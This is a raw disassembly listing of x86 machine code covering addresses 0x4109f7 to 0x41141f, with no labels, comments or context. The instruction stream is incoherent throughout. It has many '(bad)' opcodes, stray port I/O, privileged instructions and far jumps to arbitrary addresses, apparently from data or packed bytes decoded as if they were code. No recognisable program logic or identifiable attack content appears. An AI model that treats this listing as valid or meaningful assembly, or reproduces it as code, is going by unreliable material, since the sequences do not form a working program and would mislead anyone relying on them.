  4109f7:	adc    al,0xb4
  4109f9:	add    ch,bl
  4109fb:	out    0xf5,al
  4109fd:	mov    WORD PTR [ebp+0x8],es
  410a00:	mov    edi,0xa48b0a50
  410a05:	and    eax,0x852253d1
  410a0a:	clc    
  410a0b:	call   DWORD PTR [eax+0x6d]
  410a0e:	add    eax,0x82fe6d31
  410a14:	or     eax,0xbd510438
  410a19:	loope  0x410a63
  410a1b:	out    0x2b,eax
  410a1d:	mov    eax,ds:0x28910002
  410a22:	clc    
  410a23:	push   esp
  410a24:	xchg   esi,eax
  410a25:	mov    ebp,0x61822b12
  410a2a:	sub    ebp,0x8
  410a2d:	mov    edi,0x67a2586a
  410a32:	add    cl,BYTE PTR [ebx+0x735cebc5]
  410a38:	dec    ebp
  410a39:	in     al,0x79
  410a3b:	js     0x410a3d
  410a3d:	xchg   ebx,eax
  410a3e:	xlat   BYTE PTR ds:[ebx]
  410a3f:	inc    BYTE PTR [eax]
	...
  410a5d:	add    BYTE PTR [eax],ah
  410a5f:	mov    ch,0x14
  410a61:	inc    eax
  410a62:	or     eax,0xa6fe4bea
  410a67:	pusha  
  410a68:	fcom   DWORD PTR [edx+0x5a]
  410a6b:	push   ecx
  410a6c:	push   ebx
  410a6d:	push   edi
  410a6e:	or     eax,0x18c63b69
  410a73:	je     0x410a61
  410a75:	add    BYTE PTR [edx-0x79e7d82c],bl
  410a7b:	scas   al,BYTE PTR es:[edi]
  410a7c:	mov    ecx,edx
  410a7e:	jne    0x410ad0
  410a80:	inc    DWORD PTR [bp+si-0x311f]
  410a85:	and    ebx,DWORD PTR ds:0x4d8501e0
  410a8b:	sbb    al,0x8
  410a8d:	mov    al,0xc
  410a8f:	xchg   edx,eax
  410a90:	or     dl,BYTE PTR [ebx+0x75]
  410a93:	pop    ecx
  410a94:	mov    bh,0x0
  410a96:	or     eax,0xb65d425b
  410a9b:	pop    ds
  410a9c:	inc    esi
  410a9d:	pop    es
  410a9e:	or     eax,0x96eb8d14
  410aa3:	sub    ecx,DWORD PTR [ebx+eax*4]
  410aa6:	sub    DWORD PTR [eax-0x2d],ebx
  410aa9:	mov    dl,al
  410aab:	push   esp
  410aad:	and    al,0x4e
  410aaf:	aad    0x69
  410ab1:	jnp    0x410ad6
  410ab3:	push   cs
  410ab4:	ins    DWORD PTR es:[edi],dx
  410ab5:	mov    bl,BYTE PTR [edx]
  410ab7:	jle    0x410aa1
  410ab9:	fadd   DWORD PTR [ecx-0x194c70c]
  410abf:	aad    0xe8
  410ac1:	add    eax,DWORD PTR [eax]
	...
  410adf:	add    BYTE PTR [ecx+0x37ffbc40],cl
  410ae5:	(bad)  [eax+edi*8]
  410ae8:	jnp    0x410adc
  410aea:	lock mov WORD PTR [ecx+0x8],ss
  410aee:	loop   0x410ab6
  410af0:	repnz icebp 
  410af2:	add    DWORD PTR [ecx+esi*2+0x6984e870],0x74
  410afa:	call   0x73bfd5ec
  410aff:	ja     0x410a98
  410b01:	inc    ebp
  410b02:	cmc    
  410b03:	cmc    
  410b04:	stos   BYTE PTR es:[edi],al
  410b05:	push   0x7db2dbaf
  410b0a:	ins    BYTE PTR es:[edi],dx
  410b0b:	inc    esp
  410b0c:	push   ds
  410b0d:	rcl    BYTE PTR [edx+0x9],cl
  410b10:	nop
  410b11:	ret    
  410b12:	rcl    ah,1
  410b14:	inc    ebx
  410b15:	push   0x7d92dc20
  410b1a:	imul   edi,DWORD PTR [ecx+edx*1-0xd],0x77f98b27
  410b22:	stc    
  410b23:	mul    BYTE PTR [edx]
  410b25:	mov    ah,BYTE PTR ds:0xa4c33d1c
  410b2b:	mov    eax,ecx
  410b2d:	pop    es
  410b2e:	fiadd  DWORD PTR [ebx-0x69]
  410b31:	dec    esi
  410b32:	jmp    0x13c87607
  410b37:	jl     0x410b38
  410b39:	ret    0x837c
  410b3c:	dec    ebp
  410b3d:	add    ebp,DWORD PTR [edx+0x54]
  410b40:	inc    edx
  410b41:	cmp    BYTE PTR [eax],al
  410b43:	sbb    al,0x0
	...
  410b61:	add    cl,al
  410b63:	repz pop es
  410b65:	bound  edx,QWORD PTR [ecx+esi*2+0x3a]
  410b69:	mov    esp,0x7019f41a
  410b6e:	cmp    al,0x6d
  410b70:	mov    BYTE PTR [edx+eiz*4+0x1bdd4539],ch
  410b77:	push   es
  410b78:	jb     0x410b03
  410b7a:	inc    esi
  410b7b:	retf   
  410b7c:	pop    es
  410b7d:	mov    bh,0xa7
  410b7f:	rcl    BYTE PTR cs:[edi-0x1e3eb829],0xe
  410b87:	jbe    0x410bcd
  410b89:	and    eax,0x64f1f310
  410b8e:	pop    ebx
  410b8f:	icebp  
  410b90:	in     eax,dx
  410b91:	(bad)  
  410b92:	aam    0x6c
  410b94:	mov    BYTE PTR [esi-0xe897906],ah
  410b9a:	cdq    
  410b9b:	aad    0xb
  410b9d:	jo     0x410b71
  410b9f:	or     al,0xb0
  410ba1:	call   0x629567cd
  410ba6:	cmp    eax,0x97f1458a
  410bab:	retf   0x720b
  410bae:	ds and dl,cl
  410bb1:	push   0x2a
  410bb3:	or     eax,0xf113d383
  410bb8:	jbe    0x410c0d
  410bba:	adc    edi,ecx
  410bbc:	dec    edi
  410bbd:	jb     0x410b87
  410bbf:	fs popf 
  410bc1:	push   ds
  410bc2:	adc    DWORD PTR [eax],eax
  410bc4:	test   BYTE PTR [ecx+0x0],ch
	...
  410be2:	add    BYTE PTR [eax],al
  410be4:	jp     0x410bca
  410be6:	imul   ebp,esp,0x39f3c37d
  410bec:	cmp    esp,DWORD PTR [esp+ebp*4+0x3e]
  410bf0:	adc    DWORD PTR [eax],eax
  410bf2:	adc    DWORD PTR [ecx+0x56f305],0xffffffbf
  410bf9:	dec    edx
  410bfa:	push   ss
  410bfb:	xor    ecx,esi
  410bfd:	imul   DWORD PTR [edi]
  410bff:	dec    ebp
  410c00:	mov    eax,0x658acf86
  410c05:	cs inc ebp
  410c07:	clc    
  410c08:	ds add bh,bh
  410c0b:	jbe    0x410c3d
  410c0d:	or     al,0x1
  410c0f:	(bad)  
  410c10:	cmp    cl,BYTE PTR [eax]
  410c12:	xor    al,dl
  410c14:	lods   al,BYTE PTR ds:[esi]
  410c15:	inc    edi
  410c16:	test   BYTE PTR [ebx+0x5761e73a],0xf4
  410c1d:	inc    DWORD PTR [ebx+0x6a30b8c0]
  410c23:	add    BYTE PTR [ecx+0x48],dl
  410c26:	cli    
  410c27:	push   eax
  410c28:	jle    0x410c32
  410c2a:	lea    eax,[ebp-0x8]
  410c2d:	dec    esi
  410c2e:	std    
  410c2f:	add    ebx,DWORD PTR ss:[eax]
  410c32:	dec    esp
  410c33:	adc    ah,BYTE PTR [edi+edi*8+0x1848c084]
  410c3a:	cmp    DWORD PTR [ebp-0x40],0x3
  410c3e:	jne    0x410c4f
  410c40:	ret    
  410c41:	xor    al,0xff
  410c43:	dec    esi
  410c44:	int3   
  410c45:	cli    
  410c46:	adc    edi,DWORD PTR [eax+eax*1]
	...
  410c65:	add    BYTE PTR [esi-0x4a5001c1],ah
  410c6b:	mov    cl,0x32
  410c6e:	fs mov ecx,0x427e8f6
  410c75:	add    DWORD PTR [edx],ebp
  410c77:	mov    edi,ebp
  410c79:	(bad)  
  410c7a:	push   0x3b
  410c7c:	je     0x410cbe
  410c7e:	fs jae 0x410c85
  410c81:	push   esi
  410c82:	dec    esp
  410c83:	mov    edx,0x887401b3
  410c88:	les    ebx,FWORD PTR [esi-0x4a]
  410c8b:	or     BYTE PTR [eax],al
  410c8d:	push   esi
  410c8e:	or     eax,0x523f7de
  410c93:	fiadd  WORD PTR ds:0x7cb39657
  410c99:	dec    edi
  410c9a:	or     esp,esp
  410c9c:	inc    ebx
  410c9d:	je     0x410caf
  410c9f:	out    0x4c,al
  410ca1:	(bad)  
  410ca2:	es pop ebx
  410ca4:	call   0x8911c9aa
  410ca9:	sbb    eax,0xf787690f
  410cae:	nop
  410caf:	shl    bh,cl
  410cb1:	(bad)  
  410cb3:	mov    bl,BYTE PTR [edx+eax*1]
  410cb6:	or     eax,0xa7343ed
  410cbb:	out    dx,al
  410cbc:	add    eax,0xd431cb8b
  410cc1:	pop    es
  410cc2:	mov    gs,WORD PTR [ecx]
  410cc4:	jge    0x410d39
  410cc6:	pop    ss
  410cc7:	in     al,dx
  410cc8:	jl     0x410d3d
	...
  410ce6:	add    BYTE PTR [eax],al
  410ce8:	or     esi,DWORD PTR [edx+0x11bcb46a]
  410cee:	jge    0x410c7a
  410cf0:	or     edi,DWORD PTR [edi+0x1]
  410cf3:	mov    ebx,ebx
  410cf5:	add    DWORD PTR [edi+ebx*2],edx
  410cf8:	(bad)  
  410cf9:	sub    dh,bl
  410cfb:	rcl    DWORD PTR [ecx],0x69
  410cfe:	aad    0x8a
  410d00:	mov    eax,ds:0xa58ad397
  410d05:	jmp    0x410d7b
  410d07:	je     0x410d12
  410d09:	pop    ss
  410d0a:	inc    esp
  410d0b:	jmp    0xbef9:0x737bebd9
  410d12:	add    edx,DWORD PTR [esi-0xb]
  410d15:	add    DWORD PTR [ecx+0x3f],ecx
  410d18:	or     eax,0x6fe803cf
  410d1d:	xor    eax,DWORD PTR [eax+eax*1]
  410d20:	test   DWORD PTR [ebx],esp
  410d22:	jge    0x410d0e
  410d24:	(bad)  
  410d25:	(bad)  
  410d26:	ds in  al,dx
  410d28:	and    eax,DWORD PTR [edi+0x28]
  410d2b:	add    al,0xe7
  410d2d:	inc    DWORD PTR [eax-0x16ff3cf8]
  410d33:	xchg   BYTE PTR [edx+0x43c65c0a],cl
  410d39:	jg     0x410d36
  410d3b:	jl     0x410d77
  410d3d:	repz loopne 0x410cc8
  410d40:	or     dh,ah
  410d42:	out    0x88,eax
  410d44:	pop    eax
  410d45:	jp     0x410d3f
  410d47:	mov    ecx,ecx
  410d49:	jp     0x410d08
  410d4b:	dec    edx
	...
  410d68:	add    BYTE PTR [eax],al
  410d6a:	dec    edi
  410d6b:	test   BYTE PTR [esi-0xa],bl
  410d6e:	comiss xmm5,DWORD PTR [ecx]
  410d71:	inc    eax
  410d72:	arpl   si,sp
  410d74:	call   0xd1151062
  410d79:	cmp    al,0xc6
  410d7b:	shr    al,0xe9
  410d7e:	repnz out 0xe8,eax
  410d81:	jl     0x410d84
  410d83:	pushf  
  410d84:	cli    
  410d85:	ret    
  410d86:	loop   0x410d0e
  410d88:	and    BYTE PTR [esi-0x771f0c25],al
  410d8e:	or     dh,ah
  410d90:	out    0x88,eax
  410d92:	fdivr  DWORD PTR [ecx-0x28]
  410d95:	mov    bl,cl
  410d97:	fldcw  WORD PTR [ecx]
  410d99:	mov    BYTE PTR [eax+0x4],dl
  410d9c:	ins    BYTE PTR es:[edi],dx
  410d9d:	inc    ebx
  410d9e:	ds add eax,0x94017c99
  410da4:	cli    
  410da5:	ret    
  410da6:	mov    ds:0xd00467e,al
  410dab:	test   esi,ebp
  410dad:	adc    BYTE PTR [edx-0xc],0xe2
  410db1:	ror    DWORD PTR [ebx-0x32e912ed],cl
  410db7:	jmp    FWORD PTR [ecx+0x22]
  410dba:	or     eax,0x1940ff3d
  410dbf:	std    
  410dc0:	(bad)  
  410dc1:	call   0x2ab5773c
  410dc6:	or     DWORD PTR [eax+0x38],ebp
  410dc9:	push   ecx
  410dca:	adc    eax,DWORD PTR [eax]
  410dcc:	xor    edx,DWORD PTR [esi+0x0]
	...
  410dea:	add    BYTE PTR [eax],al
  410dec:	cmp    ah,0xdf
  410def:	pusha  
  410df0:	inc    esp
  410df1:	push   ebp
  410df2:	imul   ebp,ebx,0x248cd25f
  410df8:	mov    cl,0xc8
  410dfa:	(bad)  
  410dfb:	cld    
  410dfc:	or     bh,BYTE PTR [ecx+0x34]
  410dff:	ins    DWORD PTR es:[edi],dx
  410e00:	lods   eax,DWORD PTR ds:[esi]
  410e01:	mov    ebp,0x85a7d2ff
  410e06:	xor    al,0x6d
  410e08:	add    al,al
  410e0a:	call   DWORD PTR [ebp-0x41]
  410e0d:	cmp    DWORD PTR [edi-0x3fd1f02c],0x50
  410e14:	jae    0x410e8f
  410e16:	(bad)  
  410e17:	jmp    0x9e980d04
  410e1c:	test   ebx,eax
  410e1e:	fistp  DWORD PTR [ecx+0x260bf467]
  410e24:	sbb    al,0x0
  410e26:	in     eax,0xaa
  410e28:	push   cs
  410e29:	out    0xfe,al
  410e2b:	push   ss
  410e2c:	aas    
  410e2d:	test   BYTE PTR [edi+0x33e12e95],bh
  410e33:	icebp  
  410e34:	push   cs
  410e35:	add    BYTE PTR [edx-0xf],ch
  410e38:	aaa    
  410e39:	xor    al,0xd8
  410e3b:	pop    ds
  410e3c:	retf   0xfd78
  410e3f:	aam    0xa
  410e41:	cmovo  ebp,ecx
  410e44:	xchg   ebx,eax
  410e45:	push   eax
  410e46:	mov    BYTE PTR [ecx+edi*1],bh
  410e49:	fistp  WORD PTR ss:[ebp+0x4d]
  410e4d:	out    0x0,eax
  410e4f:	xchg   ecx,eax
	...
  410e6c:	add    BYTE PTR [eax],al
  410e6e:	pop    es
  410e6f:	jns    0x410e6f
  410e71:	add    BYTE PTR [esp+eiz*8-0x5c],dh
  410e75:	cmp    al,0x65
  410e77:	cld    
  410e78:	xchg   DWORD PTR [ebx],eax
  410e7a:	sti    
  410e7b:	sub    al,0x8
  410e7d:	add    BYTE PTR [ebx+ecx*4+0x79],dh
  410e81:	add    al,0xb3
  410e83:	inc    ecx
  410e84:	or     ah,BYTE PTR [eax]
  410e86:	fs cld 
  410e88:	dec    DWORD PTR [edi+eiz*1+0x70e85014]
  410e8f:	(bad)  
  410e91:	(bad)  
  410e92:	mov    edi,0xe789de3f
  410e97:	aaa    
  410e98:	mov    eax,DWORD PTR [ebp-0x68]
  410e9b:	mov    eax,DWORD PTR [ecx+0x40]
  410e9e:	leave  
  410e9f:	scas   eax,DWORD PTR es:[edi]
  410ea0:	loopne 0x410e9e
  410ea2:	stos   DWORD PTR es:[edi],eax
  410ea3:	cmc    
  410ea4:	out    0x21,al
  410ea6:	push   eax
  410ea7:	cld    
  410ea8:	dec    DWORD PTR [edi-0x34]
  410eab:	ret    0x63
  410eae:	hlt    
  410eaf:	mov    ah,0xec
  410eb1:	add    esp,esi
  410eb3:	add    ecx,DWORD PTR [ebx+0x332c6]
  410eb9:	inc    eax
  410eba:	lods   eax,DWORD PTR ds:[esi]
  410ebb:	jo     0x410eb4
  410ebd:	(bad)  
  410ebe:	jno    0x410e93
  410ec0:	cld    
  410ec1:	jmp    FWORD PTR [ebx]
  410ec3:	ja     0x410ec3
  410ec5:	jmp    esp
  410ec7:	xchg   ch,dl
  410ec9:	mov    esi,edi
  410ecb:	xchg   DWORD PTR [ebx-0x205e530],eax
  410ed1:	call   0x410ed6
	...
  410eee:	add    BYTE PTR [eax],al
  410ef0:	cmp    BYTE PTR [esi],bh
  410ef2:	(bad)  
  410ef3:	push   edx
  410ef5:	aas    
  410ef6:	or     eax,0xfa602701
  410efb:	add    BYTE PTR [edi],ch
  410efd:	jo     0x410f05
  410eff:	inc    DWORD PTR [edx+0x4]
  410f02:	push   0x0
  410f04:	mov    ebx,0xdff0272
  410f09:	je     0x410edd
  410f0b:	adc    eax,0xc38368cd
  410f10:	adc    DWORD PTR [esi],edx
  410f12:	aad    0xfe
  410f14:	add    ebx,DWORD PTR [ebp+0x77]
  410f17:	adc    al,0xc1
  410f19:	push   esi
  410f1a:	ret    0x8fff
  410f1d:	popf   
  410f1e:	pop    es
  410f1f:	adc    eax,0xffffff9c
  410f22:	js     0x410f0e
  410f24:	call   FWORD PTR [ecx+0x42]
  410f27:	aas    
  410f28:	dec    esi
  410f29:	loop   0x410f09
  410f2b:	out    0x53,eax
  410f2d:	sbb    al,0x9
  410f2f:	add    BYTE PTR [esi-0x790187d4],cl
  410f35:	adc    al,0x5c
  410f37:	push   edx
  410f38:	and    eax,0xd00b4ca
  410f3d:	jecxz  0x410efd
  410f3f:	push   cs
  410f40:	xor    eax,0xd019fb6
  410f45:	sub    ecx,DWORD PTR [eax+eax*1]
  410f48:	mov    eax,0xf98067e1
  410f4d:	cwde   
  410f4e:	(bad)  
  410f4f:	inc    DWORD PTR [edx]
  410f51:	xchg   edi,eax
  410f52:	iret   
  410f53:	mov    WORD PTR [eax],es
	...
  410f71:	add    BYTE PTR [eax-0xd018368],bh
  410f77:	rol    bh,0x1e
  410f7a:	punpckhwd mm1,QWORD PTR [ebx+0x791f49b4]
  410f81:	(bad)  
  410f82:	gs fsin 
  410f85:	call   edx
  410f87:	loope  0x410fc9
  410f89:	imul   ecx,DWORD PTR ds:0x5d1477b9,0x8fffc257
  410f93:	sbb    al,0x8
  410f95:	test   esi,edx
  410f97:	hlt    
  410f98:	add    al,0x89
  410f9a:	fidivr WORD PTR [ecx-0x647bbe]
  410fa0:	inc    ebp
  410fa1:	or     DWORD PTR [ecx-0x30b4c1c1],eax
  410fa7:	out    0xc,eax
  410fa9:	add    ecx,DWORD PTR ds:0xf9644100
  410faf:	ret    0x6be8
  410fb2:	inc    esp
  410fb3:	popf   
  410fb4:	jmp    0x4ad6:0x5f5b3e03
  410fbb:	test   BYTE PTR [ebx],ah
  410fbd:	push   eax
  410fbe:	shl    BYTE PTR [esi-0x5],cl
  410fc1:	add    edi,esi
  410fc3:	mov    edi,0xc53d3e8
  410fc8:	cmp    eax,0x5fffcd15
  410fcd:	mov    esi,0x8aa3a66
  410fd2:	xchg   ecx,eax
  410fd3:	psubsb mm0,QWORD PTR [ebx]
	...
  410ff2:	add    BYTE PTR [eax],al
  410ff4:	or     eax,0xa8501439
  410ff9:	xor    al,0x62
  410ffb:	mov    esi,0x9c1c8a46
  411000:	xchg   ecx,eax
  411001:	ins    DWORD PTR es:[edi],dx
  411002:	aam    0x2b
  411004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411005:	add    ecx,eax
  411007:	retf   
  411008:	jle    0x410fca
  41100a:	call   0x854d13e0
  41100f:	adc    al,0x4d
  411011:	add    BYTE PTR [ebx+eax*2+0x79],ah
  411015:	push   cs
  411016:	ror    DWORD PTR fs:[esi],1
  411019:	sub    DWORD PTR [ebx-0x147115a5],0x3
  411020:	or     eax,0xbee287b
  411025:	mov    DWORD PTR [ebx-0x6cbf6ea5],ebp
  41102b:	or     ecx,DWORD PTR [esi+0x39]
  41102e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41102f:	dec    edi
  411030:	ss dec eax
  411032:	adc    DWORD PTR [esp+eax*4],eax
  411035:	mov    ebx,0xec2508ff
  41103a:	fucomi st,st(6)
  41103c:	adc    BYTE PTR [eax-0x7eeed6ef],cl
  411042:	jl     0x41100d
  411044:	or     DWORD PTR ds:0x119284,eax
  41104a:	add    BYTE PTR [edx-0x7c],ch
  41104d:	push   ebp
  41104e:	(bad)  
  41104f:	idiv   dl
  411051:	scas   eax,DWORD PTR es:[edi]
  411052:	(bad)  
  411053:	call   0xd940c666
	...
  411074:	add    BYTE PTR [eax],al
  411076:	push   cs
  411077:	add    BYTE PTR [esi-0x3f],dl
  41107a:	jnp    0x41102b
  41107c:	add    cl,ch
  41107e:	xchg   DWORD PTR [ebp-0x78],ebp
  411081:	sbb    al,0xb1
  411083:	jnp    0x411083
  411085:	out    0xca,al
  411087:	xchg   edi,eax
  411088:	(bad)  
  411089:	call   0xe9aade9c
  41108e:	and    al,0x75
  411090:	push   0xfed257e5
  411095:	cld    
  411096:	scas   al,BYTE PTR es:[edi]
  411097:	jne    0x4110ad
  411099:	push   ecx
  41109a:	(bad)  
  41109b:	mov    edi,0x594c6fff
  4110a0:	test   BYTE PTR [ecx],ch
  4110a2:	sbb    eax,0x82cc82bf
  4110a7:	jne    0x4110fd
  4110a9:	mov    ecx,0xb51475d3
  4110ae:	or     al,al
  4110b0:	jmp    FWORD PTR [ecx+0x4d]
  4110b3:	or     DWORD PTR [ecx-0x18caaac],ecx
  4110b9:	cs xchg esi,eax
  4110bb:	dec    edx
  4110bc:	mov    dh,BYTE PTR [esi]
  4110be:	test   BYTE PTR [ebx-0x35],bh
  4110c1:	pop    ds
  4110c2:	pop    edx
  4110c3:	jbe    0x4110ac
  4110c5:	in     al,0xcf
  4110c7:	je     0x4110c7
  4110c9:	push   0xffffffd4
  4110cb:	js     0x4110cb
  4110cd:	add    BYTE PTR [edi],bl
  4110cf:	(bad)  
  4110d0:	xor    al,al
  4110d2:	ror    DWORD PTR fs:[ecx+0x4b810c65],0xfc
	...
  4110f6:	add    BYTE PTR [eax],al
  4110f8:	mov    bl,0x89
  4110fa:	jnp    0x4110d4
  4110fc:	mov    bl,0x6f
  4110fe:	(bad)  
  411100:	cdq    
  411101:	test   BYTE PTR [eax],dl
  411103:	inc    eax
  411104:	je     0x4110be
  411106:	or     BYTE PTR cs:[eax+eax*1+0x39],dh
  41110b:	inc    edi
  41110c:	push   0xff570b64
  411111:	push   edi
  411112:	push   es
  411113:	call   0x411222
  411118:	out    dx,al
  411119:	fsubr  st,st(1)
  41111b:	adc    BYTE PTR [eax*2-0x12a38a03],dl
  411122:	adc    ecx,DWORD PTR [edx+ecx*2+0x40]
  411126:	inc    BYTE PTR [edx+0x1b2fc68]
  41112c:	sbb    esp,esp
  41112e:	daa    
  41112f:	mov    dl,0x25
  411131:	add    BYTE PTR [ebx+ebx*8+0x75ff0728],al
  411138:	xchg   esp,eax
  411139:	in     eax,dx
  41113a:	adc    eax,DWORD PTR [edi+edx*1]
  41113d:	inc    eax
  41113e:	(bad)  
  41113f:	scas   eax,DWORD PTR es:[edi]
  411140:	and    eax,0x343200e9
  411145:	out    0xcb,eax
  411147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411148:	idiv   bh
  41114a:	rol    DWORD PTR [esp+eiz*8],0x4c
  41114e:	shrd   eax,esi,cl
  411151:	fbld   TBYTE PTR [eax-0x40]
  411154:	xchg   DWORD PTR [edi],ebx
  411156:	cwde   
  411157:	inc    ecx
  411158:	jae    0x41119c
  41115a:	retf   0x16
	...
  411179:	add    BYTE PTR [eax-0x36],ah
  41117c:	adc    DWORD PTR ds:0xb811038f,edx
  411182:	or     eax,0x8363d4b2
  411187:	test   eax,0xc1015982
  41118c:	sub    al,0x5a
  41118e:	gs popf 
  411190:	(bad)  
  411191:	cdq    
  411192:	dec    esp
  411193:	stos   BYTE PTR es:[edi],al
  411194:	sti    
  411195:	xchg   ecx,eax
  411196:	dec    ebp
  411197:	pop    ds
  411198:	add    DWORD PTR [ecx],ebx
  41119a:	fist   DWORD PTR [ebp+0x154aec1f]
  4111a0:	stc    
  4111a1:	xchg   ebp,eax
  4111a2:	in     al,dx
  4111a3:	pushf  
  4111a4:	pusha  
  4111a5:	adc    BYTE PTR [ebx],cl
  4111a7:	out    0x82,al
  4111a9:	pop    ecx
  4111aa:	inc    eax
  4111ab:	or     edi,0xc61d964
  4111b1:	fcmove st,st(4)
  4111b3:	je     0x411174
  4111b5:	(bad)  [ecx+0x22]
  4111b8:	hlt    
  4111b9:	xchg   ebx,eax
  4111ba:	dec    edi
  4111bb:	and    bh,BYTE PTR [ecx-0x13]
  4111be:	lds    ebp,FWORD PTR [ebx-0x40743688]
  4111c4:	sbb    ecx,DWORD PTR [ecx+0x6c84c20c]
  4111ca:	dec    ecx
  4111cb:	xchg   BYTE PTR [ebx],ah
  4111cd:	fisub  DWORD PTR [edi+ebp*4-0x23]
  4111d1:	cdq    
  4111d2:	int3   
  4111d3:	xchg   ebx,eax
  4111d4:	adc    edx,DWORD PTR [edi]
  4111d6:	dec    eax
  4111d7:	into   
  4111d8:	push   ecx
  4111d9:	call   0x0:0xa8cf99cc
	...
  4111fc:	ja     0x4111c3
  4111fe:	mov    ch,ch
  411200:	jo     0x4111f0
  411202:	jl     0x411255
  411204:	ret    
  411205:	test   eax,0x7a4d0cdf
  41120a:	mov    ecx,0x349219
  41120f:	pop    ds
  411210:	mov    WORD PTR [edi],fs
  411212:	sbb    BYTE PTR [edi],dl
  411214:	or     dh,cl
  411216:	pop    ss
  411217:	retf   0x2
  41121a:	test   eax,0xb5d890f3
  41121f:	ss xor al,0xc1
  411222:	push   ebp
  411223:	and    DWORD PTR [edx+eax*8-0x3e],0x3f
  411228:	call   0x6205:0x1c07327d
  41122f:	adc    BYTE PTR [eax+eax*4+0xf],dh
  411233:	xchg   DWORD PTR [edi-0x48dc0ebd],eax
  411239:	adc    BYTE PTR [esi],bh
  41123b:	cmp    DWORD PTR [ebx-0x581a6240],edx
  411241:	mov    cl,0xa1
  411243:	and    edx,DWORD PTR [ebx+0x5f23d143]
  411249:	adc    BYTE PTR [esi],bl
  41124b:	add    edx,ebp
  41124d:	sar    BYTE PTR [ebp-0x7d],0xc4
  411251:	sub    eax,DWORD PTR [edx+0x6dbfdeb6]
  411257:	inc    DWORD PTR [ebx]
  411259:	std    
  41125a:	cmp    DWORD PTR [edi-0x39622704],0x0
	...
  41127c:	add    BYTE PTR [eax],al
  41127e:	cmp    esi,DWORD PTR [esi-0x4e563bc2]
  411284:	sub    BYTE PTR [ebx-0x30aa23a8],cl
  41128a:	inc    esi
  41128b:	test   al,0xba
  41128d:	rol    DWORD PTR [eax+eax*8-0x31cfc04f],cl
  411294:	mov    edx,0x55d058c3
  411299:	jle    0x41124c
  41129b:	xchg   esp,eax
  41129c:	sahf   
  41129d:	jmp    DWORD PTR [edx+ecx*1+0x6c5c6740]
  4112a4:	mov    ?,edi
  4112a6:	mov    eax,cs:0x994ff86
  4112ac:	sti    
  4112ad:	ret    
  4112ae:	test   al,0xfb
  4112b0:	inc    DWORD PTR [ebp-0x16]
  4112b3:	das    
  4112b4:	mov    ds:0x53dcda2d,eax
  4112b9:	sbb    bh,ah
  4112bb:	push   ebp
  4112bc:	inc    eax
  4112bd:	fisttp QWORD PTR [esi-0x75]
  4112c0:	retf   
  4112c1:	adc    ch,dh
  4112c3:	push   ebp
  4112c4:	enter  0x7a46,0x4d
  4112c8:	xor    ebp,DWORD PTR [edx+eiz*2-0x3ef7e26a]
  4112cf:	adc    BYTE PTR [ebx+ecx*1-0x6c0002b4],ah
  4112d6:	test   DWORD PTR [ebp-0x80],esp
  4112d9:	aad    0x6d
  4112db:	jno    0x4112db
  4112dd:	jmp    0x4397de45
	...
  4112fe:	add    BYTE PTR [eax],al
  411300:	or     eax,0x59b14483
  411305:	leave  
  411306:	(bad)  [edx]
  411308:	or     DWORD PTR ds:0x10117fdb,ebp
  41130e:	add    cl,ch
  411310:	mov    BYTE PTR ds:[ecx+esi*4-0x28],bl
  411315:	jmp    0x411312
  411317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411318:	hlt    
  411319:	ret    
  41131a:	adc    eax,0xc37d1129
  41131f:	in     eax,0x5b
  411321:	retf   
  411322:	push   edx
  411323:	add    DWORD PTR ds:0x8df10000,eax
  411329:	mov    esp,0x724b19d7
  41132e:	(bad)  
  41132f:	sub    al,0xa9
  411331:	(bad)  
  411332:	(bad)  
  411333:	call   0x75558446
  411338:	sti    
  411339:	mov    edi,0x887971ff
  41133e:	jl     0x41139d
  411340:	xor    dh,BYTE PTR [ebp+0x73]
  411343:	repnz aam 0xcd
  411346:	push   edx
  411347:	add    dh,bl
  411349:	push   es
  41134a:	push   edi
  41134b:	inc    ecx
  41134d:	test   BYTE PTR [eax],dl
  41134f:	inc    eax
  411350:	hlt    
  411351:	repz inc ebx
  411353:	clc    
  411354:	fistp  QWORD PTR [ecx+0x77591973]
  41135a:	bnd call 0x3ef499
  411360:	sub    DWORD PTR [edi-0xe],esi
  411363:	call   0x411368
	...
  411380:	add    BYTE PTR [eax],al
  411382:	xor    ecx,esp
  411384:	std    
  411385:	push   DWORD PTR [esi-0x44]
  411388:	pop    ebp
  411389:	pop    esi
  41138a:	outs   dx,DWORD PTR ds:[esi]
  41138b:	xor    eax,ecx
  41138d:	or     BYTE PTR [esp+eiz*4-0x39b8bb2],dh
  411394:	aaa    
  411395:	pop    ebp
  411396:	cwde   
  411397:	ja     0x41139c
  411399:	mov    eax,0x3e77cc
  41139e:	inc    esp
  41139f:	push   ebp
  4113a0:	pop    sp
  4113a2:	loopne 0x4113df
  4113a4:	(bad)  
  4113a5:	push   edx
  4113a6:	stc    
  4113a7:	xchg   DWORD PTR [edx-0x1],edx
  4113aa:	stos   DWORD PTR es:[edi],eax
  4113ab:	in     eax,dx
  4113ac:	dec    esi
  4113ad:	push   0x3a
  4113af:	inc    ebx
  4113b0:	out    0x64,al
  4113b2:	sbb    eax,0xa082fffb
  4113b7:	or     BYTE PTR [ebp+0x68ba21c0],al
  4113bd:	inc    eax
  4113be:	test   eax,0xf4539247
  4113c3:	shl    DWORD PTR [esi],cl
  4113c5:	lahf   
  4113c6:	es cld 
  4113c8:	xor    al,al
  4113ca:	popf   
  4113cb:	dec    edi
  4113cc:	loop   0x41135b
  4113ce:	sbb    esp,edx
  4113d0:	test   eax,0xa9707083
  4113d5:	stos   DWORD PTR es:[edi],eax
  4113d6:	cdq    
  4113d7:	inc    edi
  4113d8:	loop   0x41142a
  4113da:	jns    0x411414
  4113dc:	mov    ss,WORD PTR [eax+0xd]
  4113df:	stos   BYTE PTR es:[edi],al
  4113e0:	aad    0x69
  4113e2:	adc    DWORD PTR [ebx+0x3],eax
  4113e5:	push   ebx
	...
  411402:	add    BYTE PTR [eax],al
  411404:	pop    esi
  411405:	hlt    
  411406:	xchg   DWORD PTR [ebx-0x16],edx
  411409:	cs jb  0x41145b
  41140c:	loop   0x4113ba
  41140e:	cli    
  41140f:	(bad)  
  411410:	push   eax
  411411:	leave  
  411412:	(bad)  
  411413:	call   edx
  411415:	pop    ecx
  411416:	jno    0x41142c
  411418:	popf   
  411419:	imul   eax,edx,0xffffffff
  41141c:	mov    DWORD PTR [ecx],ebx
  41141e:	clc    
  41141f:	push   cs
